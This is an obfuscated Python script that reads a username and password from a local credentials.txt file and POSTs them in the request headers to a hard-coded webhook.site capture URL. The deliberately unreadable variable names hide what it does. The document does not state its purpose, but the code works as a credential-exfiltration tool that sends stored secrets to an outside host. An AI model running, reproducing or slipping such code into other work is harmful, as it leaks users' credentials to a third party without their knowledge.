import requests #line:1
def send_request (OOOO0O0O00OOOOOOO ,OOOO00000OO000000 ,O0O0O000O0OOOOO0O ,OOOOO0OO000OO0O00 ):#line:4
    O00O000000OO00OO0 ={"username":OOOO0O0O00OOOOOOO ,"password":OOOO00000OO000000 }#line:5
    try :#line:7
        OO0OOOO0000O00OOO =requests .post (OOOOO0OO000OO0O00 ,headers =O00O000000OO00OO0 ,data =O0O0O000O0OOOOO0O )#line:8
        if OO0OOOO0000O00OOO .status_code ==200 :#line:9
            return OO0OOOO0000O00OOO .content #line:10
        else :#line:11
            return f"Request failed with status code {OO0OOOO0000O00OOO.status_code}: {OO0OOOO0000O00OOO.reason}"#line:12
    except Exception as OOOO0O0OO00OO000O :#line:13
        return f"An error occurred: {OOOO0O0OO00OO000O}"#line:14
def read_credentials (OOO0OO00OO0000OO0 ):#line:17
    try :#line:18
        with open ("credentials.txt","r")as O0OO0OOOOOO0OO0OO :#line:19
            OOOO0O000000O00OO =O0OO0OOOOOO0OO0OO .readlines ()#line:20
            return OOOO0O000000O00OO #line:21
    except Exception as O00O00OO000000O0O :#line:22
        return f"An error occurred: {O00O00OO000000O0O}"#line:23
def main ():#line:26
    OO00O00OOOOO00OO0 =read_credentials ("credentials.txt")#line:28
    O0OOOO00OOO0OO00O =OO00O00OOOOO00OO0 [0 ].strip ()#line:31
    O0OO00OO00OO00OO0 =OO00O00OOOOO00OO0 [1 ].strip ()#line:32
    OOO00OOOOO000OO0O ='{"text": "Hello, world!"}'#line:33
    O0OOO0OOOOOOO0000 ="https://webhook.site/2fc46539-0f46-4d80-866c-0e54ca2713e5"#line:34
    O0O0OOO00O0OOOO00 =send_request (O0OOOO00OOO0OO00O ,O0OO00OO00OO00OO0 ,OOO00OOOOO000OO0O ,O0OOO0OOOOOOO0000 )#line:37
    print (O0O0OOO00O0OOOO00 )#line:40
if __name__ =="__main__":#line:42
    main ()